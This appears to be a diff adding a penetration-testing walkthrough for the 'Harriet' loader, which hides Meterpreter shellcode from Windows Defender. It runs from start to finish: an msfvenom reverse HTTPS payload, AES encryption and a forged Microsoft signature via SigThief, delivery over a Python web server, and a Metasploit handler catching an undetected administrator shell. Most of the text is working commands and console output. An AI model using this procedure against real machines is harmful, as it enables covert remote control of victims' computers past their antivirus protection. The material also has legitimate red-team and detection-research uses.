@@ -1,0 +1,231 @@
+=========================================================================================================================================================
+AV bypass using the obfuscation script 'Harriet'
+=========================================================================================================================================================
+
+Source: => https://github.com/assume-breach/Home-Grown-Red-Team/tree/main/Harriet
+
+Harriet is shellcode loader that uses AES encryption and function/variable obfuscation to get around AV and Windows Defender. 
+
+There are four modules:
+> AES Encrypted payload
+> AES Encrypted payload with process injection
+> QueueUserAPC shellcode execution
+> ThreadPoolWait shellcode execution.
+
+All of the modules use XOR encryption for strings and function obfuscation and AES encryption for payload exection. 
+Once the payload is compiled, the script uses SigThief to sign the binary with a Microsoft certificate.
+
+
+=========================================================================================================================================================
+PoC - Example with a stageless Meterpreter (x64) https reverse shell running on a Windows 10 laptop (with the MS Defender AV enabled & up-to-date)
+=========================================================================================================================================================
+
+Step 1 - Download the Harriet tool that is part of the great Github project 'Home-Grown-Red-Team'
+--------------------------------------------------------------------------------------------------
+
++ Clone The Repo
+  > git clone https://github.com/assume-breach/Home-Grown-Red-Team.git
++ Run The Setup Script
+  > cd Home-Grown-Red-Team/Harriet/ bash setup.sh
+  
+
+Step 2 - Generate a stageless Meterpreter (x64) https reverse shell using Msfvenom
+--------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/Home-Grown-Red-Team-main/Harriet$ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem 
+LHOST=192.168.1.30 LPORT=443 -a x64 -f raw -o meterpreter-x64-stageless-reverse-https-raw.bin
+
+
+Step 3 - Generate a signed encrypted payload using Harriet
+--------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/Home-Grown-Red-Team-main/Harriet$ ./Harriet.sh 
+
+     _   _                 _      _                                                                                                                                                                                                        
+    | | | |               (_)    | |                                                                                                                                                                                                       
+    | |_| | __ _ _ __ _ __ _  ___| |_                                                                                                                                                                                                      
+    |  _  |/ _  | __|  __| |/ _ \ __|                                                                                                                                                                                                      
+    | | | | (_| | |  | |  | |  __/ |_                                                                                                                                                                                                      
+    \_| |_/\__,_|_|  |_|  |_|\___|\__|                                                                                                                                                                                                     
+                                                                                                                                                                                                                                           
+          **by assume-breach**                                                                                                                                                                                                             
+                                                                                                                                                                                                                                           
+A Payload Framework Waiting To Be Signatured                                                                                                                                                                                               
+                                                                                                                                                                                                                                           
+Choose an option:                                                                                                                                                                                                                          
+                                                                                                                                                                                                                                           
+ 1. Create FUD EXE                                                                                                                                                                                                                         
+ 2. Create FUD DLL                                                                                                                                                                                                                         
+                                                                                                                                                                                                                                           
+ >  1        
+ 
+---------------
+     _   _                 _      _                                                                                                                                                                                                        
+    | | | |               (_)    | |                                                                                                                                                                                                       
+    | |_| | __ _ _ __ _ __ _  ___| |_                                                                                                                                                                                                      
+    |  _  |/ _  | __|  __| |/ _ \ __|                                                                                                                                                                                                      
+    | | | | (_| | |  | |  | |  __/ |_                                                                                                                                                                                                      
+    \_| |_/\__,_|_|  |_|  |_|\___|\__|                                                                                                                                                                                                     
+                                                                                                                                                                                                                                           
+          **by assume-breach**                                                                                                                                                                                                             
+                                                                                                                                                                                                                                           
+A Payload Framework Waiting To Be Signatured                                                                                                                                                                                               
+                                                                                                                                                                                                                                           
+Choose an option:                                                                                                                                                                                                                          
+                                                                                                                                                                                                                                           
+ 1. Fully-Automated AES Encryption                                                                                                                                                                                                         
+ 2. Fully-Automated AES Encryption w/ Process Injection                                                                                                                                                                                    
+ 3. Fully-Automated AES Encrypted QueueUserAPC Shellcode Execution                                                                                                                                                                         
+ 4. Fully-Automated AES Encrypted ThreadPoolWait Shellcode Execution                                                                                                                                                                       
+                                                                                                                                                                                                                                           
+ > 1
+
+---------------                                                                                                                                                                                                                                          
+  ___        _                        _           _                                                                                                                                                                                        
+ / _ \      | |                      | |         | |                                                                                                                                                                                       
+/ /_\ \_   _| |_ ___  _ __ ___   __ _| |_ ___  __| |                                                                                                                                                                                       
+|  _  | | | | __/ _ \| '_ ` _ \ / _` | __/ _ \/ _` |                                                                                                                                                                                       
+| | | | |_| | || (_) | | | | | | (_| | ||  __/ (_| |                                                                                                                                                                                       
+\_| |_/\__,_|\__\___/|_| |_| |_|\__,_|\__\___|\__,_|                                                                                                                                                                                       
+                                                                                                                                                                                                                                           
+                                                                                                                                                                                                                                           
+  ___   _____ _____   _____                            _   _                                                                                                                                                                               
+ / _ \ |  ___/  ___| |  ___|                          | | (_)                                                                                                                                                                              
+/ /_\ \| |__ \ `--.  | |__ _ __   ___ _ __ _   _ _ __ | |_ _  ___  _ __                                                                                                                                                                    
+|  _  ||  __| `--. \ |  __| '_ \ / __| '__| | | | '_ \| __| |/ _ \| '_ \                                                                                                                                                                   
+| | | || |___/\__/ / | |__| | | | (__| |  | |_| | |_) | |_| | (_) | | | |                                                                                                                                                                  
+\_| |_/\____/\____/  \____/_| |_|\___|_|   \__, | .__/ \__|_|\___/|_| |_|                                                                                                                                                                  
+                                            __/ | |                                                                                                                                                                                        
+                                           |___/|_|                                                                                                                                                                                        
+Enter The Path To Your Shellcode File. ex: /home/user/Downloads/shellcode.bin                                                                                                                                                              
+                                                                                                                                                                                                                                           
+/home/jeff/Documents/Tools/Home-Grown-Red-Team-main/Harriet/meterpreter-x64-stageless-reverse-https-raw.bin                                                                                                                                
+                                                                                                                                                                                                                                           
+Name Your Malware! ex: malware.exe                                                                                                                                                                                                         
+                                                                                                                                                                                                                                           
+HarrietReverseShellTest.exe                                                                                                                                                                                                                
+                                                                                                                                                                                                                                           
++++Encrypting Payload+++                                                                                                                                                                                                                   
+                                                                                                                                                                                                                                           
+***Encryption Completed***                                                                                                                                                                                                                 
+                                                                                                                                                                                                                                           
++++Compiling Malware+++                                                                                                                                                                                                                    
+                                                                                                                                                                                                                                           
+***Malware Compiled***                                                                                                                                                                                                                     
+                                                                                                                                                                                                                                           
++++Adding Binary Signature+++                                                                                                                                                                                                              
+                                                                                                                                                                                                                                           
+***Signature Added. Happy Hunting!**                                                                                                                                                                                                       
+                                                                                                                                                                                                                                           
+jeff@kali:~/Documents/Tools/Home-Grown-Red-Team-main/Harriet$  
+
+
+
+jeff@kali:~/Documents/Tools/Home-Grown-Red-Team-main/Harriet$ ls -al                                                                                                                                                                       
+total 920                                                                                                                                                                                                                                  
+drwxr-xr-x  3 jeff jeff   4096 Dec 19 05:05 .                                                                                                                                                                                              
+drwxr-xr-x 12 jeff jeff   4096 Dec 16 17:00 ..                                                                                                                                                                                             
+-rwxr-xr-x  1 jeff jeff   1311 Dec 16 17:00 DLL.sh                                                                                                                                                                                         
+-rwxr-xr-x  1 jeff jeff   1841 Dec 16 17:00 EXE.sh                                                                                                                                                                                         
+drwxr-xr-x  8 jeff jeff   4096 Dec 16 17:00 Harriet                                                                                                                                                                                        
+-rwxr-xr-x  1 jeff jeff 348745 Dec 19 05:05 HarrietReverseShellTest.exe                                                                                                                                                                    
+-rwxr-xr-x  1 jeff jeff   1368 Dec 16 17:00 Harriet.sh                                                                                                                                                                                     
+-rw-r--r--  1 jeff jeff 201308 Dec 19 04:52 meterpreter-x64-stageless-reverse-https-raw.bin                                                                                                                                                
+-rw-r--r--  1 jeff jeff   3249 Dec 16 17:00 README.md                                                                                                                                                                                      
+-rwxr-xr-x  1 jeff jeff    191 Dec 16 17:00 setup.sh       
+
+
+
+Step 3 - Download and execute the signed encrypted payload on a target Windows 10 laptop (with the MS Defender AV enabled & up-to-date)
+---------------------------------------------------------------------------------------------------------------------------------------
+                                                                                
+jeff@kali:~/Documents/Tools/Home-Grown-Red-Team-main/Harriet$ python3 -m http.server 8080                                                                                                                                                  
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...                                                                                                                                                                               
+192.168.1.113 - - [19/Dec/2022 05:06:07] "GET / HTTP/1.1" 200 -
+192.168.1.113 - - [19/Dec/2022 05:06:08] "GET /HarrietReverseShellTest.exe HTTP/1.1" 200 -
+
+
+PS C:\temp> HarrietReverseShellTest.exe
+
+
+Step 4 - You have now a meterpreter shell running without being detected nor blocked by the MS Defender AV
+--------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 192.168.1.30; set LPORT 443;
+set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem;
+run -j"
+[sudo] password for jeff: 
+
+
+       =[ metasploit v6.1.14-dev                          ]
++ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
++ -- --=[ 596 payloads - 46 encoders - 10 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Save the current environment with the 
+save command, future console restarts will use this 
+environment again
+
+[*] Starting persistent handler(s)...
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => windows/x64/meterpreter_reverse_https
+LHOST => 192.168.1.30
+LPORT => 443
+EXITFUNC => thread
+ExitOnSession => false
+SessionCommunicationTimeout => 0
+EnableUnicodeEncoding => true
+HandlerSSLCert => /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started HTTPS reverse handler on https://192.168.1.30:443
+msf6 exploit(multi/handler) > sessions -i
+
+Active sessions
+===============
+
+No active sessions.
+
+msf6 exploit(multi/handler) > 
+[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: ynmgq3gx) Without a database connected that payload UUID tracking will not work!
+[*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: ynmgq3gx) Redirecting stageless connection from /jrHfVIB6ujjTu9K5sCQwgQLrblgJL9TcWto-xDDFsOJEJKilbtkwj9YdRHEgiNgwungZafeamW8gfzG1a9Z5oHoN5SkYULLfgDRX4H8dRmh0 with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
+[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: ynmgq3gx) Without a database connected that payload UUID tracking will not work!
+[*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: ynmgq3gx) Attaching orphaned/stageless session...
+[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: ynmgq3gx) Without a database connected that payload UUID tracking will not work!
+[*] Meterpreter session 1 opened (192.168.1.30:443 -> 127.0.0.1 ) at 2022-12-19 05:06:19 +0100
+
+msf6 exploit(multi/handler) > sessions -i 1
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                        Connection
+  --  ----  ----                     -----------                        ----------
+  1         meterpreter x64/windows  Laptop1\Administrator @ PO718687  192.168.1.30:443 -> 127.0.0.1  (192.168.1.113)
+
+msf6 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > shell
+Process 10812 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.19044.2364]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator\Downloads>powershell -exec bypass
+powershell -exec bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Users\Administrator\Downloads> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
+
+RealTimeProtectionEnabled : True
+IoavProtectionEnabled     : True
+AntispywareEnabled        : True
+
+PS C:\Users\Administrator\Downloads> 
+<SNIP>
+
